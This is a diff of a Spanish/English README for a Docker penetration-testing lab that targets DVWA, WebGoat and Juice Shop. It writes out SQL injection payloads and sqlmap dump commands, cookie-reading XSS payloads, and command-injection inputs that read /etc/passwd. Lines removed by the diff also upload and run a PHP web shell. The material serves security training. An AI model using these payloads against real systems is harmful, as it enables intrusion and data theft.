@@ -1,123 +1,137 @@
-# Unit 3 - Explotación Web y APIs 2026
+# 🦸 Unit 3: Explotación Web y APIs - LAB PRÁCTICO
 
-## Objectives
+## 🎯 Objetivos del Laboratorio
 
-1. Master web application exploitation techniques
-2. Learn API security testing
-3. Identify and exploit SQL injection vulnerabilities
-4. Learn cross-site scripting (XSS) attacks
-5. Understand modern authentication vulnerabilities
+Practicar **ataques web** en objetivos reales:
 
-## Tools Included
+1. **SQL Injection** - Extraer datos de bases de datos
+2. **XSS** - Cross-Site Scripting
+3. **CSRF** - Cross-Site Request Forgery
+4. **IDOR** - Broken Access Control
+5. **API Security** - Testing de APIs REST/GraphQL
 
-- **Kali Linux**: Penetration testing distribution
-- **OWASP ZAP**: Web vulnerability scanner
-- **Burp Suite**: Web vulnerability scanner
-- **SQLMap**: SQL injection tool
-- **XSSER**: XSS attack tool
+---
 
-## Lab Setup
+## 🏗️ Arquitectura
 
-### Build and Start Containers
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                      LABORATORIO 3                                │
+│                  EXPLOTACIÓN WEB Y APIs                            │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                   │
+│   ┌─────────────┐                            ┌─────────────┐     │
+│   │    KALI    │        ATAQUE              │   OBJETOS   │     │
+│   │   LINUX    │  ──────────────────────→    │   VULNES   │     │
+│   │ (Atacante) │                            │             │     │
+│   └─────────────┘                            └─────────────┘     │
+│        │                                            │            │
+│        │  • Burp Suite                             │            │
+│        │  • SQLMap                                │            │
+│        │  • Nikto                                │            │
+│        │  • curl                                │            │
+│        │                                          │            │
+│        │        ┌─────────────┐  ┌────────────┐  │            │
+│        │        │   WebGoat  │  │    DVWA    │  │            │
+│        │        │   :8081    │  │   :8082    │  │            │
+│        │        └─────────────┘  └────────────┘  │            │
+│        │        ┌─────────────┐                 │            │
+│        │        │Juice Shop  │                 │            │
+│        │        │   :8083    │                 │            │
+│        │        └─────────────┘                 │            │
+│        │            RED: 192.168.58.0/24       │            │
+└────────┼──────────────────────────────────────────┼────────────┘
+         │
+    SSH:2222
+```
+
+---
+
+## 🚀 Iniciar
 
 ```bash
 cd docker-labs/unit3
 docker-compose up -d
 ```
 
-### Access the Lab
+---
 
-1. **Web Interface**: http://localhost:8082 (Kali Desktop via noVNC)
-2. **SSH Access**:
-   ```bash
-   ssh root@localhost -p 2224
-   Password: toor
-   ```
+## 🎯 Objetivos
 
-### Stop and Cleanup
+| Objetivo | URL | Puerto | Vulnerabilidades |
+|----------|-----|--------|------------------|
+| **WebGoat** | http://localhost:8081 | 8081 | OWASP Top 10 |
+| **DVWA** | http://localhost:8082 | 8082 | SQLi, XSS, CSRF |
+| **Juice Shop** | http://localhost:8083 | 8083 | OWASP Top 10 |
+
+---
+
+## ⚔️ EJERCICIOS DE ATAQUE
+
+### Ejercicio 1: SQL Injection (DVWA)
 
 ```bash
-cd docker-labs/unit3
-docker-compose down
+ssh root@localhost -p 2222
+# Password: toor
 
-# Remove volumes (deletes all data)
+# Nivel: Low
+# Login bypass:
+admin'--
+
+# Con SQLMap:
+sqlmap -u "http://192.168.58.x/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch
+```
+
+### Ejercicio 2: XSS Reflected (DVWA)
+
+```bash
+# Payload básico
+<script>alert(document.cookie)</script>
+
+# Payload avanzado
+<img src=x onerror=alert(document.cookie)>
+```
+
+### Ejercicio 3: XSS Stored (DVWA)
+
+```bash
+# Comentario con XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+```
+
+### Ejercicio 4: Command Injection
+
+```bash
+# Ping command
+127.0.0.1; ls -la
+127.0.0.1; cat /etc/passwd
+```
+
+### Ejercicio 5: WebGoat - SQL Injection
+
+```bash
+# Acceder: http://localhost:8081/WebGoat
+# Completar lecciones de SQLi
+```
+
+---
+
+## 📋 Checklist
+
+| # | Tarea | Completado |
+|---|-------|-----------|
+| 1 | SQLi en DVWA | ☐ |
+| 2 | XSS Reflected | ☐ |
+| 3 | XSS Stored | ☐ |
+| 4 | Command Injection | ☐ |
+| 5 | WebGoat lessons | ☐ |
+| 6 | Extraer database | ☐ |
+
+---
+
+## 🛑 Cleanup
+
+```bash
 docker-compose down -v
-```
-
-## Lab Exercises
-
-### Exercise 1: SQL Injection
-
-1. Test for SQL injection with SQLMap:
-   ```bash
-   sqlmap -u "http://192.168.0.103/login?username=admin&password=test" --dbs
-   ```
-
-2. Dump database contents:
-   ```bash
-   sqlmap -u "http://192.168.0.103/login?username=admin&password=test" -D testdb --tables
-   ```
-
-### Exercise 2: Cross-Site Scripting
-
-1. Test for XSS vulnerabilities:
-   ```bash
-   xsser -u "http://192.168.0.103/search?query=test" -g
-   ```
-
-2. Inject stored XSS payload:
-   ```bash
-   curl -X POST http://192.168.0.103/comments \
-     -d 'comment=<script>alert("XSS")</script>' \
-     -H "Content-Type: application/x-www-form-urlencoded"
-   ```
-
-### Exercise 3: API Testing
-
-1. Test API endpoints with ZAP:
-   ```bash
-   zap-cli quick-scan -r -s xss,sql-injection http://192.168.0.103/api
-   ```
-
-2. Test for broken authentication:
-   ```bash
-   curl -X GET http://192.168.0.103/api/users/1
-   ```
-
-### Exercise 4: File Upload Vulnerabilities
-
-1. Upload a malicious file:
-   ```bash
-   curl -X POST http://192.168.0.103/upload \
-     -F "file=@shell.php;type=image/png" \
-     -F "submit=Upload"
-   ```
-
-2. Execute the uploaded file:
-   ```bash
-   curl http://192.168.0.103/uploads/shell.php
-   ```
-
-## Resources
-
-- [OWASP Top 10](https://owasp.org/Top10/)
-- [SQLMap Documentation](https://sqlmap.org/)
-- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
-- [API Security Best Practices](https://owasp.org/www-project-api-security/)
-
-## Troubleshooting
-
-### Cannot connect to target URL
-
-Check network connectivity:
-```bash
-cd docker-labs/unit3
-docker exec -it kali ping 192.168.0.103
-```
-
-### SQLMap isn't finding vulnerabilities
-
-Try different injection techniques:
-```bash
-sqlmap -u "http://192.168.0.103/login?username=admin&password=test" --technique=B --level=5 --risk=3
 ```
